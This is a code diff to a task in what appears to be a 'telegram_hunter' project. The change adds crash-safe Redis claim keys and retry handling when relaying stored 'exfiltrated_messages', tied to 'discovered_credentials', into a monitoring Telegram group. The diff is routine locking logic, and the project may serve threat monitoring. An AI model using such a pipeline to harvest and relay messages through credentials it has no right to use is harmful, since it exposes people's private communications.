@@ -240,11 +240,35 @@ async def _broadcast_logic():
     group_id = settings.MONITOR_GROUP_ID
 
     sent_count = 0
+    skipped_count = 0
     # Local cache to avoid DB roundtrips within this batch if multiple messages for same cred
     cached_topic_ids = {}
+    
+    # ==============================================
+    # REDIS-BASED CLAIMS (crash-safe with TTL)
+    # ==============================================
+    # Each message gets a Redis key with 5-minute TTL
+    # If worker crashes, keys expire and messages are retried
+    # If send succeeds, we mark DB and delete key
+    CLAIM_TTL = 300  # 5 minutes
 
     for msg in messages:
+        msg_id = msg["id"]
+        claim_key = f"telegram_hunter:broadcast_claim:{msg_id}"
+        
         try:
+            # ==============================================
+            # TRY TO CLAIM THIS MESSAGE (atomic, crash-safe)
+            # ==============================================
+            # SETNX returns True only if key didn't exist
+            # TTL ensures auto-expiry if worker crashes
+            claimed = redis_client.set(claim_key, "1", nx=True, ex=CLAIM_TTL)
+            
+            if not claimed:
+                # Another worker/run already claimed this message
+                skipped_count += 1
+                continue
+            
             cred_id = msg["credential_id"]
             # Extract meta from the joined discovered_credentials
             cred_info = msg.get("discovered_credentials", {})
@@ -300,8 +324,10 @@ async def _broadcast_logic():
             cached_topic_ids[cred_id] = thread_id
             
             # Send Message (with retry for deleted topics)
+            send_success = False
             try:
                 await broadcaster_service.send_message(group_id, thread_id, msg)
+                send_success = True
             except Exception as e:
                 # Check for topic deletion/not found
                 err_str = str(e)
@@ -315,22 +341,40 @@ async def _broadcast_logic():
                     # Update Cache so subsequent messages in this batch don't recreate again
                     cached_topic_ids[cred_id] = thread_id
                     # Retry Send
-                    await broadcaster_service.send_message(group_id, thread_id, msg)
+                    try:
+                        await broadcaster_service.send_message(group_id, thread_id, msg)
+                        send_success = True
+                    except Exception as retry_e:
+                        print(f"    ❌ Failed after topic recreation: {retry_e}")
                 else:
-                    raise e
+                    print(f"    ❌ Send failed: {e}")
             
-            # Update status
-            db.table("exfiltrated_messages").update({"is_broadcasted": True}).eq("id", msg["id"]).execute()
-            sent_count += 1
+            if send_success:
+                # ==============================================
+                # SUCCESS: Mark in DB and keep Redis key (auto-expires)
+                # ==============================================
+                db.table("exfiltrated_messages").update({"is_broadcasted": True}).eq("id", msg_id).execute()
+                sent_count += 1
+                print(f"    ✅ Broadcasted msg {msg_id}")
+            else:
+                # ==============================================
+                # FAILED: Delete Redis claim so it can be retried
+                # ==============================================
+                redis_client.delete(claim_key)
             
             # Rate limit
             await asyncio.sleep(2.0) 
 
         except Exception as e:
-            print(f"Error broadcasting msg {msg['id']}: {e}")
+            print(f"Error broadcasting msg {msg_id}: {e}")
+            # Delete claim on error so message can be retried
+            redis_client.delete(claim_key)
             continue
-            
-    return f"Broadcasted {sent_count} messages."
+    
+    result = f"Broadcasted {sent_count}/{len(messages)} messages"
+    if skipped_count > 0:
+        result += f" (skipped {skipped_count} already claimed)"
+    return result
 
 @app.task(name="flow.system_heartbeat")
 def system_heartbeat():
